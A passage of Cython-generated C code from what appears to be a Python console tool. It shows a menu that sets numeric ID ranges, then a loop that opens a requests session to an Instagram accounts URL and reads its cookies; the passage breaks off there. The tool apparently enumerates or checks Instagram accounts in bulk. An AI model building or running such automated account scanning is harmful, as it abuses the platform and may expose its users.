  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 27, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__103);
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__103);
  PyTuple_SET_ITEM(__pyx_t_13, 28, __pyx_kp_u__103);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_green); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 29, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__101);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__101);
  PyTuple_SET_ITEM(__pyx_t_13, 30, __pyx_kp_u__101);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_blue); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 31, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_2);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_2);
  PyTuple_SET_ITEM(__pyx_t_13, 32, __pyx_kp_u_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_white); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 33, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__104);
  __pyx_t_14 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__104);
  PyTuple_SET_ITEM(__pyx_t_13, 34, __pyx_kp_u__104);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_yellow); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 35, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_2012);
  __pyx_t_14 += 33;
  __Pyx_GIVEREF(__pyx_kp_u_2012);
  PyTuple_SET_ITEM(__pyx_t_13, 36, __pyx_kp_u_2012);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cyan); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 37, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 38, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 39, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__103);
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__103);
  PyTuple_SET_ITEM(__pyx_t_13, 40, __pyx_kp_u__103);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_orange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 41, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__101);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__101);
  PyTuple_SET_ITEM(__pyx_t_13, 42, __pyx_kp_u__101);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_blue); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 43, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_0_3);
  __pyx_t_14 += 4;
  __Pyx_GIVEREF(__pyx_kp_u_0_3);
  PyTuple_SET_ITEM(__pyx_t_13, 44, __pyx_kp_u_0_3);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_red); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 45, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_yellow); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 46, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_2011_2);
  __pyx_t_14 += 5;
  __Pyx_GIVEREF(__pyx_kp_u_2011_2);
  PyTuple_SET_ITEM(__pyx_t_13, 47, __pyx_kp_u_2011_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_white); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 48, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__105);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 4;
  __Pyx_GIVEREF(__pyx_kp_u__105);
  PyTuple_SET_ITEM(__pyx_t_13, 49, __pyx_kp_u__105);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_red); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 50, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_2023);
  __pyx_t_14 += 22;
  __Pyx_GIVEREF(__pyx_kp_u_2023);
  PyTuple_SET_ITEM(__pyx_t_13, 51, __pyx_kp_u_2023);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cyan); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 52, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 53, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 54, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 55, __pyx_kp_u__5);
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_13, 56, __pyx_t_14, __pyx_t_15); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_13 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_t_13) < 0) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = PyTuple_New(5); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_14 = 0;
  __pyx_t_15 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_green); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__106);
  __pyx_t_14 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__106);
  PyTuple_SET_ITEM(__pyx_t_13, 1, __pyx_kp_u__106);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_white); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 2, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_Please_type_the_number_of_your_c);
  __pyx_t_14 += 39;
  __Pyx_GIVEREF(__pyx_kp_u_Please_type_the_number_of_your_c);
  PyTuple_SET_ITEM(__pyx_t_13, 3, __pyx_kp_u_Please_type_the_number_of_your_c);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_reset); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 4, __pyx_t_12);
  __pyx_t_12 = 0;
  __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_13, 5, __pyx_t_14, __pyx_t_15); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 250, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_xYourKing, __pyx_t_13) < 0) __PYX_ERR(0, 250, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_xYourKing); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 253, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_16 = (__Pyx_PyUnicode_Equals(__pyx_t_13, __pyx_kp_u_1, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 253, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (__pyx_t_16) {

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_bbk, __pyx_int_10000) < 0) __PYX_ERR(0, 254, __pyx_L1_error)

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_int_17699999) < 0) __PYX_ERR(0, 255, __pyx_L1_error)

    
    goto __pyx_L36;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_xYourKing); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_16 = (__Pyx_PyUnicode_Equals(__pyx_t_13, __pyx_kp_u_2, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (__pyx_t_16) {

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_bbk, __pyx_int_17699999) < 0) __PYX_ERR(0, 257, __pyx_L1_error)

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_int_263014407) < 0) __PYX_ERR(0, 258, __pyx_L1_error)

    
    goto __pyx_L36;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_xYourKing); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_16 = (__Pyx_PyUnicode_Equals(__pyx_t_13, __pyx_kp_u_0_2, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (__pyx_t_16) {

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_bbk, __pyx_int_10000) < 0) __PYX_ERR(0, 260, __pyx_L1_error)

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_int_21254029834) < 0) __PYX_ERR(0, 261, __pyx_L1_error)

    
    goto __pyx_L36;
  }

  
  /*else*/ {
    __pyx_t_13 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 263, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  }
  __pyx_L36:;

  
  while (1) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_5);
      /*try:*/ {

        
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_kp_u_https_www_instagram_com_accounts) < 0) __PYX_ERR(0, 268, __pyx_L39_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_requests); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 269, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_Session); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 269, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_13 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 269, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_session, __pyx_t_13) < 0) __PYX_ERR(0, 269, __pyx_L39_error)
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_session); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 270, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 270, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_a); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 270, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
          }
        }
        __pyx_t_13 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_11, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 270, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_aa, __pyx_t_13) < 0) __PYX_ERR(0, 270, __pyx_L39_error)
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_aa); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 271, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_cookies); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 271, __pyx_L39_error)
        __Pyx_GOTREF(__pyx_t_1);
